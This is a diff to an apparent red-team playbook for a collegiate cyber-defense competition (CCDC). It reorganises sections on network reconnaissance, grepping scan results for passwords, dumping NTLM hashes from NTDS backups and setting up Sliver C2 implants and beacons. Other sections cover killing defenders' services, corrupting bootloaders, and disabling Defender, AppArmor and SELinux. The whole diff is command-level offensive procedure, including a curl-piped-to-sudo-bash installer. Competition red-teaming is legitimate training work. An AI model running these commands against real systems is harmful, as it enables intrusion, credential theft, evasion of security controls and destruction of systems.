@@ -18,6 +18,14 @@ pagetitle: Red Teaming for CCDC
   - Additionally, one final `sudo nmap -sn -T4 {IP_range} | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u > ips.txt` to just figure out what hosts are online
     - Then pass alive hosts to autorecon with `sudo autorecon -t ips.txt -p 21,22,23,25,53,80,110,111,135,139,143,389,443,445,465,636,873,993,995,1025-1030,1080,1433,1521,1723,3306,3389,5432,5900,5985,6379,6667,8000,8080,8443,8888 -o autorecon_results --max-scans 100`
 
+## Autorecon
+- Overall status: `find autorecon_results -name "*.txt" -type f -exec grep -l "open" {} \; | sort`
+- Common vulns: `grep -r "MS17-010\|CVE-\|Anonymous\|Password:" autorecon_results`
+- Anonymous access: `grep -r "Anonymous" autorecon_results`
+- Find DC: `grep -r "Domain Controller" autorecon_results`
+- Passwords: `grep -r "Password:\|Credentials:" autorecon_results`
+- Missing SMB signing: `grep -r "SMB signing required: false" autorecon_results`
+
 ## Machine Persistence
 
 **Windows:**
@@ -88,15 +96,6 @@ pagetitle: Red Teaming for CCDC
 - We can now access all NTLM hashes and Kerberos keys using `impacket-secretsdump`
 	- `impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL`
 
-
-## Autorecon
-- Overall status: `find autorecon_results -name "*.txt" -type f -exec grep -l "open" {} \; | sort`
-- Common vulns: `grep -r "MS17-010\|CVE-\|Anonymous\|Password:" autorecon_results`
-- Anonymous access: `grep -r "Anonymous" autorecon_results`
-- Find DC: `grep -r "Domain Controller" autorecon_results`
-- Passwords: `grep -r "Password:\|Credentials:" autorecon_results`
-- Missing SMB signing: `grep -r "SMB signing required: false" autorecon_results`
-
 ## Sliver
 - Can build from source with `sudo apt install golang-go`, `curl https://sliver.sh/install | sudo bash`, and `cd sliver && make`
 - To make sure we don't kill the mf server, let's operate from a client
@@ -104,7 +103,7 @@ pagetitle: Red Teaming for CCDC
   - On the server: `new-operator --name {op_name} --lhost localhost` and `multiplayer` to enable clients
   - On the client, outside of tmux: `sliver-client import {config_file}` and `sliver-client` to join
 - `wg` can be used to start listening for incoming sessions on a sneaky wireguard udp (use mtls otherwise if we dont get a callback)
-  - Shells from evil-winrm seem to die (even as local admin??), use `psexec` to get a shell as nt authority and run it from there
+  - **IMPORTANT!!** `evil-winrm` implants and beacons will DIE a HORRIBLE DEATH, use another method to run the implant/beacon
 - Then, use `generate` to create implants or beacons
   - `generate --wg {our_IP} --os linux` for an implant
   - `generate beacon --wg 192.168.0.102 -j {jitter} -S {wait_seconds} --os linux` 
@@ -125,7 +124,9 @@ pagetitle: Red Teaming for CCDC
   - Install all with `armory install all`
   - Sharphound: `sharp-hound-4 -- '-c all,GPOLocalGroup'`
 
-## Killing Services
+## Messing with Blue Team
+
+**Killing Services**
 - Soft breaks:
   - `systemctl stop {service}` 
     - This is too kind, we shant do this :>
@@ -147,33 +148,36 @@ pagetitle: Red Teaming for CCDC
   - `timebomb.sh`
   - Corrupt bootloader partitions
 
-## Trolling
+**Trolling**
 - By far the most important part of CCDC
 - `wall "dance"`
 - Set all computers to same background:
   - GPO management > right-click domain > Create GPO in domain and link here > Right click on new GPO + edit > User Configuration\Policies\Administrative Templates\Desktop\Desktop > desktop wallpaper > select `enabled` + enter path of image and select fill for style > apply + ok > `gpupdate /force`
 
-**Defender/AppArmor/SELinux**
-- Defender:
-  - Disable with:
-    - `reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f`
-    - `gpedit.msc` > Computer Configuration > Administrative Templates > Windows Components > Microsoft Defender Antivirus > Turn off Microsoft Defender Antivirus > Enabled
-    - Just run all of these in powershell and defender should be lobotomized by the end:
-      - `'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All`
-      - `Set-MpPreference -DisableRealtimeMonitoring $true`
-      - `Remove-WindowsFeature Windows-Defender, Windows-Defender-GUI`
-      - `Stop-Service WinDefend -Force`
-      - `Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force`
-      - `Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager" -Name "AllowAntivirus" -Value 0 -Type DWord`
-      - Then reboot
-  - Bypassing with FilelessPELoader:
-    - `https://github.com/SaadAhla/FilelessPELoader`
-- AppArmor:
-  - `sudo systemctl stop apparmor`, `sudo systemctl disable apparmor`, `sudo apt purge apparmor`
-- SELinux:
-  - Status with `sestatus`
-  - Temp disable: `sudo setenforce 0` or `sudo setenforce permissive`
-  - Permanent disable: set `SELINUX=enforcing` to `disabled` in `/etc/selinux/config` and reboot
+## Dealing with System Protections
+
+**Defender**
+- Disable with:
+  - `reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f`
+  - `gpedit.msc` > Computer Configuration > Administrative Templates > Windows Components > Microsoft Defender Antivirus > Turn off Microsoft Defender Antivirus > Enabled
+  - Just run all of these in powershell and defender should be lobotomized by the end:
+    - `'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All`
+    - `Set-MpPreference -DisableRealtimeMonitoring $true`
+    - `Remove-WindowsFeature Windows-Defender, Windows-Defender-GUI`
+    - `Stop-Service WinDefend -Force`
+    - `Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force`
+    - `Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager" -Name "AllowAntivirus" -Value 0 -Type DWord`
+    - Then reboot
+- Bypassing with FilelessPELoader:
+  - `https://github.com/SaadAhla/FilelessPELoader`
+
+**AppArmor**
+- `sudo systemctl stop apparmor`, `sudo systemctl disable apparmor`, `sudo apt purge apparmor`
+
+**SELinux**
+- Status with `sestatus`
+- Temp disable: `sudo setenforce 0` or `sudo setenforce permissive`
+- Permanent disable: set `SELINUX=enforcing` to `disabled` in `/etc/selinux/config` and reboot
 
 
 ## Misc
